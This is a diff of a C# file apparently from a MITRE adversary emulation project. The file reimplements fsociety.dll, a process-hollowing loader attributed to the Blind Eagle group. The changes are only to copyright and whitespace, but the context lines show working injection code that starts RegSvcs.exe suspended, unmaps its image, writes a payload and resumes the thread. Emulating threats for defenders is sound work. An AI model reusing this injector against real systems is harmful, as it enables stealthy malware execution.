@@ -5,8 +5,8 @@
             fsociety.dll is a dll used by APT-C-36 Blind Eagle to perform process hollowing and inject a paylaod into an                  arbitrary Windows executable, typically RegSvcs.exe
             The DLL is heavily based on code from Nyan Cat's Lime-Crypters runPE class (https://github.com/NYAN-x-CAT/Lime-               Crypter/blob/master/Lime-Crypter/Resources/Stub.cs)
 
- # © 2023 MITRE Engenuity, LLC. Approved for Public Release. Document number CT0076
- 
+ # © 2023 The MITRE Corporation, LLC. Approved for Public Release. Document number CT0076
+
  # Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at
 
  # http://www.apache.org/licenses/LICENSE-2.0
@@ -14,7 +14,7 @@
  # Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.
 
  # This project makes use of ATT&CK®
- # ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 
+ # ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/
 
 # Revision History:
 
@@ -125,7 +125,7 @@ namespace fsociety
             {
                 // Create process: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe
                 if (!Tools.CreateProcess_API(path, text, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref startup_INFORMATION, ref process_INFORMATION))
-                {                    
+                {
                     throw new Exception();
                 }
                 // set variables for the address and imagebase of the payload
@@ -134,35 +134,35 @@ namespace fsociety
                 // prepare array to hold thread context
                 int[] contextArray = new int[179];
                 contextArray[0] = 65538;
-                
+
                 // determine if thread is 32 or 64 bit
                 if (Tools.Size() == 4)
                 {
                     if (!Tools.GetThreadContext_API(process_INFORMATION.ThreadHandle, contextArray))
-                    {                        
+                    {
                         throw new Exception();
                     }
                 }
                 else
                 {
                     if (!Tools.Wow64GetThreadContext_API(process_INFORMATION.ThreadHandle, contextArray))
-                    {                        
+                    {
                         throw new Exception();
                     }
                 }
-                // set location of ebx 
+                // set location of ebx
                 int ebx = contextArray[41];
                 int baseAddress = 0;
                 // read process memory of RegSvcs.exe
                 if (!Tools.ReadProcessMemory_API(process_INFORMATION.ProcessHandle, ebx + 8, ref baseAddress, 4, ref readWrite))
-                {                   
+                {
                     throw new Exception();
                 }
                 // compare image base of RegSvcs.exe with base address of the payload
                 if (imageBase == baseAddress)
                     // unmap process memory of victim process
                     if (Tools.NtUnmapViewOfSection_API(process_INFORMATION.ProcessHandle, baseAddress) != 0)
-                    {                   
+                    {
                         throw new Exception();
                     }
                 // calculate length, and headersize of paylaod - allocate virtual memory
@@ -177,7 +177,7 @@ namespace fsociety
                 }
                 // write the first portion of the payload to the victim process
                 if (!Tools.WriteProcessMemory_API(process_INFORMATION.ProcessHandle, newImageBase, data, headerSize, ref readWrite))
-                {                   
+                {
                     throw new Exception();
                 }
                 // calculate offset and number of sections
@@ -195,7 +195,7 @@ namespace fsociety
                         Tools.CopyByBlock(data, pointerToRawData, sectionData, 0, sectionData.Length);
                         // write remaining payload to the victim process RegSvcs.exe
                         if (!Tools.WriteProcessMemory_API(process_INFORMATION.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite))
-                        {                           
+                        {
                             throw new Exception();
                         }
                     }
@@ -204,7 +204,7 @@ namespace fsociety
                 // final write of data from the allocated memory
                 byte[] pointerData = (byte[])Tools.GetTheBytes(newImageBase);
                 if (!Tools.WriteProcessMemory_API(process_INFORMATION.ProcessHandle, ebx + 8, pointerData, 4, ref readWrite))
-                {                    
+                {
                     throw new Exception();
                 }
                 // Set Entry Point Address
@@ -221,20 +221,20 @@ namespace fsociety
                 {
                     // set thread context to point to new entry point
                     if (!Tools.SetThreadContext_API(process_INFORMATION.ThreadHandle, contextArray))
-                    {                       
+                    {
                         throw new Exception();
                     }
                 }
                 else
                 {
                     if (!Tools.Wow64GetThreadContext_API(process_INFORMATION.ThreadHandle, contextArray))
-                    {                       
+                    {
                         throw new Exception();
                     }
                 }
                 // resume thread to execute payload
                 if (Tools.ResumeThread_API(process_INFORMATION.ThreadHandle) == -1)
-                {                   
+                {
                     throw new Exception();
                 }
             }
